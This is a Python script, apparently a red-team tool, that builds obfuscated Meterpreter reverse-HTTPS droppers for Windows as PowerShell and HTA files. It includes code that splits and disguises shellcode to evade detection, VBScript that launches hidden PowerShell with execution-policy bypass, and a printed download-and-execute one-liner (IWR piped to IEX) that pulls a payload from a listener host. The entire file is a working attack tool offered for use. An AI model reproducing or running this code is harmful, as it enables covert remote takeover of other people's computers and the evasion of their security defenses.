#!/usr/bin/env python3
# shellcode replacement script py-version
# meterpreter PSH-NET payload: generation + obfuscation
# meterpreter HTA payload: generation + obfuscation
# darksh3llRU v1.1
# April 2021, added x86 and x64 payloads into hta dropper (adjusted for ARCH based payload selection), other changes (obfuscation, functions)

import os, inquirer, ipaddress, validators, subprocess, re, base64, random, string

# Default values
defListenerIP = '192.168.88.19'
defListenerPort=8443
defListenerURI_x64='/logout'
defListenerURI_x86='/signout'
defProxyType='HTTP'
defProxyHost=''
defProxyPort=''
defProxyUser=''
defProxyPass=''
defUserAgent ='Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
defDownloadURL='http://192.168.88.19/'

# Payload selection
def msfpayload_select():
    options = [
    inquirer.List('choice',
                message="Select 'x64' staged or stageless meterpreter reverse https:",
                choices=['windows/x64/meterpreter_reverse_https', 'windows/x64/meterpreter/reverse_https'],
            ),
    ]
    selection = inquirer.prompt(options)
    payload_x64 = selection["choice"]
    options = [
        inquirer.List('choice',
                message="Select 'x86' staged or stageless meterpreter reverse https :",
                choices=['windows/meterpreter_reverse_https', 'windows/meterpreter/reverse_https'],
            ),
    ]
    selection = inquirer.prompt(options)
    payload_x86 = selection["choice"]
    return payload_x64, payload_x86

# Payload options input
def msfpayload_options_set(payload):
    if "x64" in payload:
        defListenerURI = defListenerURI_x64
    else:
        defListenerURI = defListenerURI_x86
    print("Default payload options:\n" + "ListenerIP: " + defListenerIP + "\n" + "ListenerPort: " + str(defListenerPort) + "\n" + "ListenerURI: " + defListenerURI + "\n")
    print("Default payload proxy options:\n" + "ProxyType: " + defProxyType + "\n" + "ProxyHost: " + defProxyHost + "\n" + "ProxyPort: " + str(defProxyPort) + "\n", end = '')
    print("ProxyUser: " + defProxyUser + "\n" + "ProxyPass: " + defProxyPass + "\n")
    print("Default UserAgent: " + defUserAgent + "\n")
    print("Default Download URL: " + defDownloadURL + "\n")
    print("----------------------------------------------------------------------------------------------------")
    # ListenerIP
    try:
        ListenerIP = ipaddress.ip_address(input("Enter LISTENER IP address: ") or defListenerIP)
    except ValueError:
       print("Not a valid Listener IP address")
       exit()
    # ListenerPort
    try:
        ListenerPort = int(input("Enter LISTENER TCP port: ") or defListenerPort)
    except ValueError:
       print("Not a valid Listener TCP port")
       exit()
    if ListenerPort in range(0,65536):
        pass
    else:
        print("Not a valid Listener TCP port")
        exit()
    # ListenerURI !!!NO CHECKS!!!
    ListenerURI = str(input("Enter LISTENER URI: ") or defListenerURI)
    # ProxyType
    options = [
    inquirer.List('choice',
                message="Proxy type to be used?",
                choices=['HTTP', 'SOCKS'],
            ),
    ]
    selection = inquirer.prompt(options)
    ProxyType = selection["choice"]
    # ProxyHost
    try:
        ProxyHost = ipaddress.ip_address(input("Enter Proxy IP address: "))
    except ValueError:    
        print("Not a valid ProxyHost IP address, assigning default value")
        ProxyHost = defProxyHost
    # ProxyPort !!!DUMB CHECKS!!!
    try:
        ProxyPort = int(input("Enter Proxy TCP port: "))
    except ValueError:
       print("Not a valid Proxy TCP port, assigning default value")
       ProxyPort = defProxyPort
    if ProxyPort in range(0,65536):
        pass
    else:
        print("Proxy TCP port is not within required range, assigning default value")
        ProxyPort = defProxyPort
    # ProxyUser !!!NO CHECKS!!!
    ProxyUser = str(input("Enter Proxy username: ") or defProxyUser)
    # ProxyPass !!!NO CHECKS!!!
    ProxyPass = str(input("Enter Proxy user password: ") or defProxyPass)
    # UserAgent !!!NO CHECKS!!!
    UserAgent = str(input("Enter User Agent string: ") or defUserAgent)
    # DownloadURL
    DownloadURL = str(input("Enter payload download URL address: ") or defDownloadURL)
    if validators.url(DownloadURL) == True:
        pass
    else:
        print("Download URL is not valid, assigning default value")
        DownloadURL = defDownloadURL
    payload_options = ("LHOST=" + str(ListenerIP) + " LPORT=" + str(ListenerPort) + " LURI=" + str(ListenerURI) + " HttpUserAgent='" + str(UserAgent)
                       + "'" + " OverrideLHOST=" + str(ListenerIP) + " OverrideLPORT=" + str(ListenerPort) + " OverrideRequestHost=true")
    dropper_filename = str(ListenerIP) + "-" + str(ListenerPort) + "-" + str(ListenerURI).strip("/") + ".ps1"
    return payload_options, UserAgent, DownloadURL, dropper_filename

def generate_raw_payload(payload_type, payload_options, DownloadURL, UserAgent, dropper_filename):
    print("Default dropper filename: " + str(dropper_filename))
    payload_filename = str(input("Enter filename with extension ps1: ") or str(dropper_filename))
    args = "msfvenom -p " + payload_type +" " + payload_options + " -f psh-net -o " + payload_filename
    print("Generating meterpreter payload with msfvenom...")
    subprocess.run(args, shell=True, stdout=subprocess.DEVNULL)
    return payload_filename

def change_payload(payload_filename):
    substr = 'FromBase64String'
    raw_base64 = ""
    with open (payload_filename, "rt") as raw_file:
        raw_file.seek(0,0)
        i = 0
        for line in raw_file:
            i += 1
            if line.find(substr) != -1:
                line_num = i - 1
                match = re.search(r'.*FromBase64String\((.*)\)', line)
                raw_base64 = match.group(1).strip('"')
                extracted = base64.b64decode(match.group(1).strip('"')).hex()
                options = [
                inquirer.List('choice',
                            message="Would you like to change stager's shellcode?",
                            choices=['YES', 'NO'],
                        ),
                ]
                selection = inquirer.prompt(options)
                answer = selection["choice"]
                if answer == 'YES':
                    file = open("shellcode.txt", "w") 
                    file.write(extracted) 
                    file.close()
                    print("Stager shellcode is saved as shellcode.txt\n")
                    print("Once you make changes in shellcode.txt press any key to continue\n")
                    input()
                    print("Loading shellcode from shellcode.txt")
                    file = open("shellcode.txt", "r")
                    new_shellcode = file.read()
                    new_base64 = str(base64.b64encode(bytes.fromhex(new_shellcode)))[2:][:-1]
                else:
                    pass
                    print("Proceeding without stager's shellcode changes...")
                    new_base64 = raw_base64
    try:
        chunk_size = int(input("Enter chunk_size to split base64 encoded stager(50-1500),\n recommended 65-80 for staged meterpreter and 1200-1500 for stageless: "))
    except ValueError:
       print("Not a valid chunk_size entered, assigning default value 200")
       chunk_size = 200
    if chunk_size in range(49,1501):
        pass
    else:
        print("Not a valid chunk_size entered, assigning default value 200")
        chunk_size = 200
    shellcode_parts = int(len(new_base64)/chunk_size) + 1
    shellcode_chunks = [new_base64[i:i+chunk_size] for i in range(0, len(new_base64), chunk_size)]

    with open(payload_filename, 'r+') as raw_file:
        sc_concat = ""
        payloadchunkname = "$" + junk_string(10)
        contents = raw_file.readlines()
        for i in range(len(shellcode_chunks)):
            contents.insert(line_num, payloadchunkname + str(i) + '="' + str(shellcode_chunks[i]) + '"\n\n\n')
            sc_concat += payloadchunkname + str(i) + "+"
        sc_concat = sc_concat[:-1]
        raw_file.seek(0)
        raw_file.writelines(contents)

    with open (payload_filename, "rt") as raw_file:
        stager = raw_file.read()
    raw_file = open(payload_filename, "wt")
    stager = stager.replace('"'+ raw_base64 +'"', sc_concat)
    stager = stager.replace('kernel32.dll', 'ke"+"rn"+"e"+"l"+"32."+"d"+"l"+"l')
    raw_file.write(stager)
    print("PSH-NET Dropper " + payload_filename + " has been updated")
    return payload_filename

def obfuscate_payload(payload_filename):
    options = [
    inquirer.List('choice',
                message="Would you like to obfuscate the dropper?",
                choices=['YES', 'NO'],
            ),
    ]
    selection = inquirer.prompt(options)
    answer = selection["choice"]
    if answer == 'YES':
        lines_count = len(open(payload_filename).readlines(  )) * 2
        with open(payload_filename, 'r+') as raw_file:
            contents = raw_file.readlines()
            contents.insert(0, "#" + junk_string(512) + "\n" + "#" + junk_string(512) + "\n" + "#" + junk_string(512) + "\n" + "#" + junk_string(512) + "\n")
            contents.insert(2, "#" + junk_string(512) + "\n")
            for i in range(18, lines_count, 2):
                contents.insert(i,"#" + junk_string(512) + "\n")
            raw_file.seek(0)
            raw_file.writelines(contents)
            print("Dropper " + payload_filename + " obfuscation done.")
    else:
        print("Proceeding without dropper obfuscation...")
        
    return payload_filename

def junk_string(length):
    letters = string.ascii_letters
    junk = ''.join(random.choice(letters) for i in range(length))
    return junk

def generate_hta_stager(payload_filename):
    var1 = "$"+junk_string(8); var2 = "$"+junk_string(8); var3 = "$"+junk_string(8)
    hta_stager = ("""if([IntPtr]::Size -eq 4){""" + var1 + """='powershell.exe'}else{"""
                 + var1 + """=$env:windir+'\\system32\\WindowsPowerShell\\v1.0\\powershell.exe'};""" + var2 + """=New-Object System.Diagnostics.ProcessStartInfo;""" + var2 + """.FileName="""
                 + var1 + """;""" + var2 + """.Arguments="[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();"""
                 """[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR """
                 + DownloadURL + payload_filename + """ -UserAgent '""" + UserAgent + """'|IEX";""" + var2 + """.UseShellExecute=$false;"""
                 + var2 + """.RedirectStandardOutput=$false;""" + var2 + """.WindowStyle='Hidden';""" + var2 + """.CreateNoWindow=$false;"""
                 + var3 + """=[System.Diagnostics.Process]::Start(""" + var2 + """);""")
    hta_base64 = str(base64.b64encode(bytes(hta_stager, 'utf-16le')))[2:][:-1]
    return hta_base64

def generate_hta(DownloadURL, UserAgent, payload_filename_x64, payload_filename_x86):
    def_hta_filename = os.path.commonprefix([payload_filename_x64,payload_filename_x86])[:-1]
    if def_hta_filename == "":
        def_hta_filename = 'account_settings.hta'
    else:
        pass
    print("Preparing HTA dropper...\nDefault HTA filename: " + def_hta_filename + ".hta")
    hta_filename = str(input("Enter filename with extension hta: ") or def_hta_filename + ".hta")
    hta_base64_x64 = generate_hta_stager(payload_filename_x64)
    hta_base64_x86 = generate_hta_stager(payload_filename_x86)
    var4 = junk_string(8); var5 = junk_string(8)
    hta_template = ("""<script language="VBScript">
  window.moveTo -1337, -1337
  Set {var4} = CreateObject("Wsc"+"ri"+"pt.S"+"hell")
  Set {var5} = CreateObject("Sc"+"rip"+"tin"+"g.F"+"ile"+"S"+"ys"+"temO"+"bje"+"ct")
  For each data in Split({var4}.ExpandEnvironmentStrings("%P"+"at"+"h%"),";")
    If {var5}.FileExists(data + "\\po"+"wer"+"sh"+"el"+"l.e"+"xe") Then
        If inStr(1,data,"sy"+"s"+"te"+"m32",1) Then
            If  inStr(1,{var4}.ExpandEnvironmentStrings("%ProgramW6432%"),"%",1) Then
                {var4}.Run "powershell.exe -nop -w hidden -Exec Bypass -e {hta_base64_x86}",0
            Else
                {var4}.Run "powershell.exe -nop -w hidden -Exec Bypass -e {hta_base64_x64}",0
            End If
        Else
            '{var4}.Run "powershell.exe -nop -w hidden -Exec Bypass -e {hta_base64_x86}",0
        End If
      Exit For
    End If
  Next
  window.close()
</script>
""")
    hta_parameters = {"hta_base64_x64":hta_base64_x64, "hta_base64_x86":hta_base64_x86, "var4":var4, "var5":var5}
    with open(hta_filename, 'wt') as hta_file:
        hta_file.write(hta_template.format(**hta_parameters))
    print("HTA dropper saved as " + hta_filename)
    return hta_filename

def print_ps_usage(DownloadURL, payload_filename, UserAgent):
    print("""PSH-NET dropper usage example:\npowershell.exe -Window Hidden -Nop -Exec Bypass -C "[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();""", end = '')
    print("""[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR('""", end = '')
    print(DownloadURL + payload_filename + """') -UserAgent '""" + UserAgent + """'|IEX" """)
    return 1
                  
if __name__=='__main__':
    print("!!!!!!!!!!!!!!!!!!!! Review default script values !!!!!!!!!!!!!!!!!!!!")
    payload_x64, payload_x86 = msfpayload_select()

    print("!!!!!!!!!!!!!!!!!!!! Working with x64 payload !!!!!!!!!!!!!!!!!!!!")
    payload_options, UserAgent, DownloadURL, dropper_filename = msfpayload_options_set(payload_x64)
    payload_filename = generate_raw_payload(payload_x64, payload_options, DownloadURL, UserAgent, dropper_filename)
    change_payload(payload_filename)
    payload_filename_x64 = obfuscate_payload(payload_filename)
    print_ps_usage(DownloadURL, payload_filename_x64, UserAgent)

    print("!!!!!!!!!!!!!!!!!!!! Working with x86 payload !!!!!!!!!!!!!!!!!!!!")
    payload_options, UserAgent, DownloadURL, dropper_filename = msfpayload_options_set(payload_x86)
    payload_filename = generate_raw_payload(payload_x86, payload_options, DownloadURL, UserAgent, dropper_filename)
    change_payload(payload_filename)
    payload_filename_x86 = obfuscate_payload(payload_filename)
    print_ps_usage(DownloadURL, payload_filename_x86, UserAgent)

    print("!!!!!!!!!!!!!!!!!!!! Generating HTA !!!!!!!!!!!!!!!!!!!!")
    generate_hta(DownloadURL, UserAgent, payload_filename_x64, payload_filename_x86)
    print("!!!!!!!!!!!!!!!!!!!! Script execution finished !!!!!!!!!!!!!!!!!!!!")
